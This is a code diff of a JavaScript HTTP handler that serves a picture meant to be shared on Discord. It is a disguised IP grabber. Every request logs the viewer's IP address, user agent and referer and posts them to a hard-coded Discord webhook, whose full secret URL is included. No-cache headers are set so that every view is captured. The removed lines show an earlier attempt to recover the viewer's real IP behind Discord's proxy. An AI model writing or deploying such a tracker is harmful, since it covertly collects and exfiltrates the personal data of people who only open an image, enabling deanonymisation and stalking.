@@ -2,68 +2,89 @@ import fs from 'fs';
 import path from 'path';
 
 export default async function handler(req, res) {
-  // TENTA VÁRIAS FORMAS DE PEGAR IP REAL
-  const forwarded = req.headers['x-forwarded-for'];
-  const realIp = req.headers['x-real-ip'];
-  const cfConnectingIp = req.headers['cf-connecting-ip']; // Cloudflare
-  const connectionIp = req.connection?.remoteAddress;
-  const socketIp = req.socket?.remoteAddress;
+  // 1. CAPTURA O IP
+  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 'IP não detectado';
+  const userAgent = req.headers['user-agent'] || 'N/A';
+  const referer = req.headers['referer'] || 'Direto';
+  const agora = new Date();
   
-  // Decifra o IP REAL
-  let ip = 'IP não detectado';
+  console.log('══════════════════════════════════════');
+  console.log('📸 FOTO ACESSADA - foto-discord2.png');
+  console.log('══════════════════════════════════════');
+  console.log('🌐 IP:', ip);
+  console.log('🕐 Data:', agora.toLocaleString('pt-BR'));
+  console.log('🔗 Referer:', referer);
+  console.log('👤 User-Agent:', userAgent.substring(0, 100));
+  console.log('📊 URL:', req.url);
+  console.log('══════════════════════════════════════');
   
-  if (forwarded) {
-    // Pega o PRIMEIRO IP da lista (usuário real)
-    const ips = forwarded.split(',').map(ip => ip.trim());
-    ip = ips[0];
-    console.log('📊 IPs no x-forwarded-for:', ips);
-  } else if (cfConnectingIp) {
-    ip = cfConnectingIp;
-  } else if (realIp) {
-    ip = realIp;
-  } else if (connectionIp) {
-    ip = connectionIp.replace('::ffff:', '');
-  } else if (socketIp) {
-    ip = socketIp.replace('::ffff:', '');
+  // 2. DISCORD WEBHOOK
+  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1456767774368993380/-412QnxkT_spPdRfKW2uuhMevQM23-v7XGR9yjOfz0ymAg7ooyJZ85kBILbzAEiaIZQ-';
+  
+  if (DISCORD_WEBHOOK.includes('discord.com')) {
+    try {
+      await fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `📸 **foto-discord2.png ACESSADA**\n🌐 IP: \`${ip}\`\n🕐 ${agora.toLocaleString('pt-BR')}\n🔗 ${req.url}`
+        })
+      });
+      console.log('✅ Mensagem enviada para Discord');
+    } catch (err) {
+      console.log('❌ Erro Discord:', err.message);
+    }
   }
   
-  console.log('========== CAPTURA DE IP ==========');
-  console.log('🌐 IP CAPTURADO:', ip);
-  console.log('🕐 Data:', new Date().toLocaleString('pt-BR'));
-  console.log('🔗 User-Agent:', req.headers['user-agent']?.substring(0, 80));
-  console.log('📊 Referer:', req.headers['referer'] || 'Direto');
-  console.log('==================================');
-  
-  // SE for IP do Discord (seus servidores)
-  const discordIps = ['162.159.128.233', '162.159.129.233', '162.159.130.233', '162.159.133.233'];
-  if (discordIps.includes(ip)) {
-    console.log('⚠️ ATENÇÃO: Este é o IP do Discord (proxy)');
-    console.log('👤 O usuário REAL não foi detectado porque Discord fez cache');
-  }
-  
-  // Envia para Discord webhook
-  const webhook = 'https://discord.com/api/webhooks/1456767774368993380/-412QnxkT_spPdRfKW2uuhMevQM23-v7XGR9yjOfz0ymAg7ooyJZ85kBILbzAEiaIZQ-';
-  
+  // 3. ENVIA A FOTO foto-discord2.png
   try {
-    await fetch(webhook, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: `🌐 **TENTATIVA DE ACESSO**\nIP Detectado: \`${ip}\`\n⚠️ Pode ser proxy do Discord\n🕐 ${new Date().toLocaleString('pt-BR')}`
-      })
-    });
-  } catch (e) {}
-  
-  // Envia a foto
-  try {
-    const fotoPath = path.join(process.cwd(), 'public', 'minha-foto.png');
-    const fotoBuffer = fs.readFileSync(fotoPath);
+    // CAMINHO DA SUA FOTO
+    const fotoPath = path.join(process.cwd(), 'public', 'foto-discord2.png');
     
+    // Verifica se arquivo existe
+    if (!fs.existsSync(fotoPath)) {
+      console.log('❌ ERRO: Arquivo não encontrado:', fotoPath);
+      console.log('📁 Listando arquivos em public/:');
+      
+      try {
+        const publicPath = path.join(process.cwd(), 'public');
+        const arquivos = fs.readdirSync(publicPath);
+        console.log('Arquivos encontrados:', arquivos);
+      } catch (e) {
+        console.log('Não foi possível listar arquivos');
+      }
+      
+      throw new Error('Arquivo foto-discord2.png não encontrado');
+    }
+    
+    // Lê o arquivo
+    const fotoBuffer = fs.readFileSync(fotoPath);
+    console.log('✅ Foto carregada. Tamanho:', fotoBuffer.length, 'bytes');
+    
+    // Configura headers
     res.setHeader('Content-Type', 'image/png');
+    res.setHeader('Content-Length', fotoBuffer.length);
+    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    res.setHeader('Pragma', 'no-cache');
+    res.setHeader('Expires', '0');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('X-Content-Type-Options', 'nosniff');
+    
+    // Envia a foto
     res.send(fotoBuffer);
+    console.log('✅ Foto enviada com sucesso!');
     
   } catch (error) {
-    console.log('❌ Erro na foto');
-    res.status(404).send('Foto não encontrada');
+    console.log('❌ ERRO AO ENVIAR FOTO:', error.message);
+    
+    // Fallback: pixel vermelho simples
+    const pixel = Buffer.from(
+      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
+      'base64'
+    );
+    
+    res.setHeader('Content-Type', 'image/png');
+    res.setHeader('Cache-Control', 'no-cache');
+    res.send(pixel);
   }
 }
